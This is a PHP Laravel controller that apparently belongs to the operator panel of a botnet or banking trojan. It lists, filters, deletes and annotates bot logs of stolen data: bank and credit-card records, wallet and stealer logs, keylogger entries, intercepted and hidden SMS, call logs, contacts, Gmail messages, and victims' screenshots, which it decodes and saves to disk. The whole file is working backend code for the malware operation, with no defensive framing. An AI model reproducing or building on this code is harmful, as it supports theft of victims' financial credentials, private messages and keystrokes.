<?php

namespace App\Http\Controllers\Api\v1;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Http\Resources\BotLog\BotLogCollection;
use App\Http\Response\AccessDeniedResponse;
use App\Models\BotLog;
use App\Models\UserBotTimestamp;
use App\Services\LogsService\LogsFilter;
use App\Services\LogsService\LogsService;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\ValidationException;
use Throwable;

class LogController extends Controller
{
    private array $ignoredTypes = ["application", "TakeScreenShot"];

    /**
     * @throws ValidationException
     */
    public function index2(Request $request): JsonResponse
    {
        $this->validate($request, [
            "application" => "string|nullable",
            "bot_id" => "string|nullable",
            "type" => "string|nullable",
            "per_page" => "integer",
            "filters" => "array",
            "filters.application" => "string|nullable",
            "filters.query" => "string|nullable",
            "sort" => "array",
            "sort.field" => "string|in:id,bot_id,application,created_at",
            "sort.by" => "string|in:ascend,descend",
        ]);

        if (!in_array($request->get("type"), $this->ignoredTypes, true) && !auth()->user()?->can($request->get("type") . ".list")) {
            return AccessDeniedResponse::response();
        }

        $logs = BotLog::query();

        $user = auth()->user();

        if (!$user) {
            return ApiResponse::error();
        }

        $logs = $logs->join("bots", "bot_logs.bot_id", "=", "bots.id")
            ->select("bot_logs.*");

        if ($user->role !== "root" || count($user->tagsNames)) {
            $logs->whereIn("bots.tag", $user->tagsNames);
        }

        if ($request->get("bot_id")) {
            $logs->where("bot_id", $request->get("bot_id"));
        }

        if ($request->get("application")) {
            $logs->where("application", $request->get("application"));
        }

        if ($request->get("type") && $request->get("type") !== "application") {
            $logs->where("type", $request->get("type"));
        }

        if (in_array($request->get("type"), [
            "banks",
            "stealers",
            "crypt",
            "shops",
            "emails",
            "wallets",
            "credit_cards",
        ])) {
            $application = $request->get("filters")["application"] ?? null;
            $searchQuery = $request->get("filters")["query"] ?? null;

            $sortBy = $request->get("sort")["by"] ?? null;
            $sortField = $request->get("sort")["field"] ?? null;

            $logs = $logs->when(!empty($application), function ($query) use ($application) {
                $query->where("application", $application);
            })->when(!empty($searchQuery), function ($query) use ($searchQuery) {
                $query->where("log", "LIKE", "%$searchQuery%");
            })->when(!empty($sortBy) && !empty($sortField), function ($query) use ($sortBy, $sortField) {
                if ($sortBy === "descend") {
                    $query->orderByDesc($sortField);
                } else {
                    $query->orderBy($sortField);
                }
            })->with("bot");
        } else {
            $logs = $logs->orderByDesc("created_at");
        }

        if (in_array($request->get("type"), ["pushlist", "events"])) {
            $logs = $logs->get();
        } else if (in_array($request->get("type"), ["otheraccounts", "applist", "callLog"])) {
            $log = $logs->first();
            $logs = new Collection;
            if ($log) {
                $logs->add($log);
            }
        } else if ($request->get("type") === "phonenumber") {
            /** @var Collection $logs */
            $logs = $logs->paginate($request->get("per_page", 20));
            $_logs = collect([]);

            foreach ($logs as $log) {
                try {
                    $_logs = $_logs->merge(collect(json_decode($log->log["contacts"], true)));
                } catch (Throwable) {
                    $_logs = [];
                }
            }

            if ($logs->count()) {
                $logs[0]->log = $_logs;
                $logs = $logs->take(1);
            } else {
                $logs = $_logs;
            }
        } else if ($request->get("type") === "events") {
            $logs = $logs->paginate($request->get("per_page", 20));
        } else if ($request->get("type") === "TakeScreenShot") {
            $logs = $logs->paginate($request->get("per_page", 9));
            foreach ($logs as $key => $log) {
                $image = $log->log["nameValuePairs"]["image64"];  // your base64 encoded
                $image = str_replace("data:image/png;base64,", "", $image);
                $image = str_replace(" ", "+", $image);
                $imageName = $log->log["nameValuePairs"]["name"] . "." . "png";
                $filePath = "screenshots/" . $imageName;

                if (!Storage::disk("public")->exists($filePath)) {
                    Storage::disk("public")->put($filePath, base64_decode($image));
                }

                $logs[$key]->log = [
                    "image" => $filePath,
                    "created_at" => $logs[$key]->created_at?->format("Y-m-d"),
                ];
            }
        } else if ($request->get("type") === "keylogger") {
            $logs = $logs->whereRaw("JSON_EXTRACT(log, ?)", ["$.\"" . $request->get("keyloggerAction") . "\""])
                ->paginate($request->get("per_page", 15));
        } else {
            $logs = $logs->paginate($request->get("per_page", 15));
        }

        if (in_array($request->get("type"), [
            "banks",
            "stealers",
            "crypt",
            "shops",
            "emails",
            "wallets",
            "credit_cards",
        ])) {
            auth()->user()?->entitiesTimestamps?->update([
                $request->get("type") => Carbon::now()->toDateTimeString(),
            ]);
        }

        if ($request->get("type") === "application") {
            $timestamp = UserBotTimestamp::firstOrNew([
                "user_id" => auth()->user()->id,
                "bot_id" => $request->get("bot_id"),
                "application" => $request->get("application"),
            ]);
            $timestamp->visited_at = Carbon::now()->toDateTimeString();
            $timestamp->save();
        }

        if ($request->get("type") == "hidesms") {
            $logsCollection = new Collection;

            foreach ($logs as $log) {
                $logsCollection = $logsCollection->merge([$log->log]);
            }

            $logsCollection = $logsCollection->paginate($request->get("per_page"));

            if (isset($log)) {
                $log->log = $logsCollection->values();
                $logs = collect([$log]);
            } else {
                $logs = collect([]);
            }

            /** @var LengthAwarePaginator $logs */
            $array = $logsCollection->toArray();

            return new JsonResponse([
                "payload" => $logs,
                "success" => true,
                "keyloggerAction" => $request->get("keyloggerAction"),
                "meta" => [
                    "current_page" => $array["current_page"],
                    "per_page" => $array["per_page"],
                    "to" => $array["to"] ?? null,
                    "total" => $array["total"],
                ],
            ]);
        }

        if ($request->get("type") === "events") {
            $logsCollection = new Collection;
            $eventLog = [];
            foreach ($logs as $log) {
                foreach ($log->log as $_log) {
                    foreach ($_log as $key => $value) {
                        $eventLog[] = [
                            "eventName" => $key,
                            "value" => $value,
                            "bot_id" => $log->bot_id,
                        ];
                    }
                }
                $logsCollection = $logsCollection->merge($eventLog);
            }

            $log = $logs->first();

            if ($log) {
                $log->log = $logsCollection->unique()->take(20)->toArray();
                $logs = collect([$log]);
            } else {
                $logs = collect([]);
            }

            $logs = $logs->paginate(15);

            auth()->user()?->entitiesTimestamps?->update([
                "events" => Carbon::now()->toDateTimeString(),
            ]);
        }

        if (in_array($request->get("type"), ["otheraccounts", "phonenumber", "applist"])) {
            $logs = $logs->paginate(15);
        }

        if ($request->get("type") === "pushlist") {
            $logs = $logs->paginate($request->get("per_page", 15));
        }

        if ($request->get("type") === "smslist") {
            $logsCollection = new Collection;
            foreach ($logs as $log) {
                $_logs = json_decode(base64_decode($log->log["sms"]), true);
                $logsCollection = $logsCollection->merge($_logs);
            }

            $log = $logs->first();

            if ($log) {
                $log->log = $logsCollection->unique()->take(20)->toArray();
                $logs = collect([$log]);
            } else {
                $logs = collect([]);
            }

            $logs = $logs->paginate(15);

            auth()->user()?->entitiesTimestamps?->update([
                "events" => Carbon::now()->toDateTimeString(),
            ]);
        }

        if (in_array($request->get("type"), ["gmail_mes", "callLog"])) {
            $logs = $logs->paginate(1);
        }

        return BotLogCollection::make($logs)->response();
    }

    public function index(Request $request): JsonResponse
    {
        $this->validate($request, [
            "application" => "string|nullable",
            "bot_id" => "string|nullable",
            "type" => "string|nullable",
            "per_page" => "integer",
            "filters" => "array",
            "filters.application" => "string|nullable",
            "filters.query" => "string|nullable",
            "sort" => "array",
            "sort.field" => "string|in:id,bot_id,application,created_at",
            "sort.by" => "string|in:ascend,descend",
        ]);

        $user = auth()->user();

        if (!$user) {
            return ApiResponse::error();
        }

        if (
            !in_array($request->get("type"), $this->ignoredTypes, true)
            && !$user?->can($request->get("type") . ".list")
        ) {
            return AccessDeniedResponse::response();
        }

        $logsFilter = LogsFilter::fromRequest($request);
        $logsFilter->setUser($user);

        $logsService = new LogsService($logsFilter);

        $logs = $logsService->getLogs();

        if ($request->get("type") === "application") {
            $timestamp = UserBotTimestamp::firstOrNew([
                "user_id" => auth()->user()->id,
                "bot_id" => $request->get("bot_id"),
                "application" => $request->get("application"),
            ]);
            $timestamp->visited_at = Carbon::now()->toDateTimeString();
            $timestamp->save();
        }

        return BotLogCollection::make($logs)->response();
    }

    /**
     * @throws ValidationException
     */
    public function delete(Request $request): ApiResponse
    {
        // TODO check user access

        $this->validate($request, [
            "logIds" => "array|required",
            "logIds.*" => "exists:bot_logs,id",
        ]);

        $botLogs = BotLog::whereIn("id", $request->get("logIds"))->get();

        foreach ($botLogs as $botLog) {
            if (!in_array($botLog->type, $this->ignoredTypes, true) && !auth()->user()?->can($botLog->type . ".delete")) {
                return AccessDeniedResponse::response();
            }
        }

        BotLog::whereIn("id", $request->get("logIds"))->delete();

        return ApiResponse::success([
            "logIds" => $request->get("logIds"),
        ]);
    }

    /**
     * @throws ValidationException
     */
    public function editComment(Request $request): ApiResponse
    {
        // TODO check user access
        $this->validate($request, [
            "comment" => "string|nullable",
            "logIds" => "array|required",
            "logIds.*" => "exists:bot_logs,id",
        ]);

        $botLogs = BotLog::whereIn("id", $request->get("logIds"))->get();

        foreach ($botLogs as $botLog) {
            if (!in_array($botLog->type, $this->ignoredTypes, true) && !auth()->user()?->can($botLog->type . ".editComment")) {
                return AccessDeniedResponse::response();
            }
        }

        BotLog::whereIn("id", $request->get("logIds"))->update([
            "comment" => $request->get("comment"),
        ]);

        return ApiResponse::success([
            "logIds" => $request->get("logIds"),
            "comment" => $request->get("comment"),
        ]);
    }
}
